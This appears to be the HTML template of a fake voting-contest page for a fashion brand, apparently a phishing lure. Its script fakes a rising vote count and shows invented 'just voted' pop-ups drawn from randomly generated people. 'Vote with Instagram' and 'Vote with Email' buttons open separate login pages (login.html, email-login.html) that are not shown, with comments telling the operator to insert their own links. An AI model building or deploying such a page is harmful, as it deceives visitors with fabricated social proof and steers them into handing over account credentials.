<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>FASHION</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&family=Lato:wght@400;700&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Lato', sans-serif;
      background: #f5f5f5;
    }
    h1 {
      font-family: 'Oswald', sans-serif;
    }
    .toast-container {
      position: fixed;
      bottom: 85px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 50;
      max-width: 340px;
      width: 100%;
    }
    .live-toast {
      animation: slideIn 0.4s ease forwards;
    }
    @keyframes slideIn {
      from { opacity: 0; transform: translateY(15px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

  <div class="bg-white w-full max-w-[360px] mx-auto rounded-3xl shadow-2xl overflow-hidden">

    <!-- Header -->
    <div class="pt-5 pb-2 text-center">
      <h1 class="text-lg font-bold tracking-wider text-gray-900 uppercase">
        FASHION BRAND
      </h1>
    </div>

    <!-- Store Image -->
    <!-- Store Image - Reduced & Relative Size -->
<!-- Store Image - Increased Height -->
<!-- Store Image - Reduced & Relative Size -->
<div class="px-4">
  <div class="relative w-full max-h-[240px] overflow-hidden rounded-2xl shadow-sm">
    <img src="6a4d9613-4e5c-41fd-bb65-b6f49326f87b.jpeg" 
         alt="Clothing store" 
         class="w-full h-auto object-cover">
  </div>
</div>

    <!-- Name -->
    <div class="text-center mt-3 text-[21px] font-bold text-gray-800">
      Robyn Bacon
    </div>

    <!-- Vote Counter -->
    <div class="mx-4 mt-4">
      <div class="border-2 border-blue-500 rounded-2xl p-3.5">
        <div class="flex items-center gap-2 mb-2.5">
          <div class="w-3 h-3 bg-blue-600 rounded-full border-2 border-blue-300"></div>
          <span class="text-sm font-medium text-gray-700">
            Total Votes: <strong id="vote-count">5678</strong> out of 5688
          </span>
        </div>
        <div class="h-2 bg-gray-200 rounded-full overflow-hidden">
          <div class="h-full w-[95%] bg-blue-500 rounded-full"></div>
        </div>
      </div>
    </div>

    <!-- Votes to Win -->
    <div class="text-center mt-3 mb-5 text-sm font-bold text-gray-700">
      ▲ Total Votes To Win: <span class="text-gray-900">10</span>
    </div>

    <!-- Vote Buttons -->
    <div class="flex gap-3 mx-4 mb-6">
      
      <!-- Instagram Button -->
      <button onclick="voteWithRedirect('instagram')" 
              class="flex-1 bg-[#E4405F] hover:bg-[#d63a56] active:scale-95 text-white text-[10px] font-bold py-3 rounded-2xl flex flex-col items-center justify-center gap-1 transition-all shadow-sm">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.849.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.327.273 2.78.027 7.05.014 8.333 0 8.74 0 12c0 3.259.014 3.668.072 4.948.243 4.269 2.677 6.697 6.948 6.948 1.28.058 1.687.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.27-.25 6.697-2.677 6.948-6.948.058-1.28.072-1.687.072-4.948 0-3.259-.014-3.668-.072-4.948-.25-4.27-2.677-6.697-6.948-6.948C15.668.014 15.26 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zm0 10.162a3.999 3.999 0 110-7.998 3.999 3.999 0 010 7.998zm6.406-11.845a1.44 1.44 0 11-2.88 0 1.44 1.44 0 012.88 0z"/>
        </svg>
        <span>VOTE WITH INSTAGRAM</span>
      </button>

      <!-- Email (Outlook style) Button -->
      <button onclick="voteWithRedirect('email')" 
              class="flex-1 bg-[#0078D4] hover:bg-[#0063B1] active:scale-95 text-white text-[10px] font-bold py-3 rounded-2xl flex flex-col items-center justify-center gap-1 transition-all shadow-sm">
        <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
          <path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2.01 2.01 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2" />
        </svg>
        <span>VOTE WITH EMAIL</span>
      </button>

    </div>

  </div>

  <!-- Toast Container -->
  <div id="toast-container" class="toast-container"></div>

  <script>
    // Fake vote counter
    let voteCount = 5678;
    const voteCountEl = document.getElementById('vote-count');

    setInterval(() => {
      if (voteCount < 5688) {
        voteCount += Math.random() > 0.7 ? 1 : 0;
        voteCountEl.textContent = voteCount;
      }
    }, 2800);

    // Live vote toast
    let currentToastTimeout = null;

    async function showLiveVoteToast() {
      const container = document.getElementById('toast-container');
      container.innerHTML = '';

      if (currentToastTimeout) clearTimeout(currentToastTimeout);

      try {
        const res = await fetch('https://randomuser.me/api/?nat=us,gb,ca,au');
        const data = await res.json();
        const user = data.results[0];

        const fullName = `${user.name.first} ${user.name.last}`;
        const country = user.location.country;

        const toastHTML = `
          <div class="live-toast bg-gray-100 mx-4 rounded-2xl p-3.5 flex items-center gap-3 shadow">
            <img src="${user.picture.medium}" class="w-8 h-8 rounded-full flex-shrink-0" alt="">
            <p class="text-xs text-gray-600 leading-tight">
              <strong>${fullName}</strong> from <strong>${country}</strong> just voted for <strong>Robyn Bacon</strong>
            </p>
          </div>
        `;

        container.innerHTML = toastHTML;

        currentToastTimeout = setTimeout(() => {
          container.innerHTML = '';
        }, 3800);

      } catch (e) {
        console.log("Random user fetch failed");
      }
    }

    // Show toasts
    setInterval(showLiveVoteToast, 2000);
    setTimeout(showLiveVoteToast, 700);

    // Redirect function
    function voteWithRedirect(method) {
      let url = '';

      if (method === 'email') {
        url = 'email-login.html';           // ← Change to your actual email vote page
      } else if (method === 'instagram') {
        url = 'login.html';                // ← Change to your Instagram vote link
      }

      if (url) {
        window.open(url, '_blank');
      }
    }
  </script>

</body>
</html>
